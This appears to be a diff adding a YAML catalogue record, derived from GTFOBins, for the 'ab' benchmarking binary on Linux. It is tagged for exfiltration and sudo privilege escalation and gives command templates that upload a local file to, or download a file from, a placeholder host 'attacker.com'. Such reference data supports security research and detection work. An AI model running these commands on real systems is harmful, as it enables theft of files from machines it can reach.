@@ -1,0 +1,85 @@
+id: gtfobins/ab/upload/sudo
+type: binary
+platform: linux
+name: ab
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: ab -p /path/to/input-file http://attacker.com/
+references:
+- https://gtfobins.github.io/gtfobins/ab/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ab:
+          functions:
+            download:
+            - code: ab -v2 http://attacker.com/path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            upload:
+            - code: ab -p /path/to/input-file http://attacker.com/
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-server
+    upstream_url: https://gtfobins.github.io/gtfobins/ab/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:761a16751ebac6c72082c215256b3e8a3082ca05360cff52bf70fda5cd137e9f
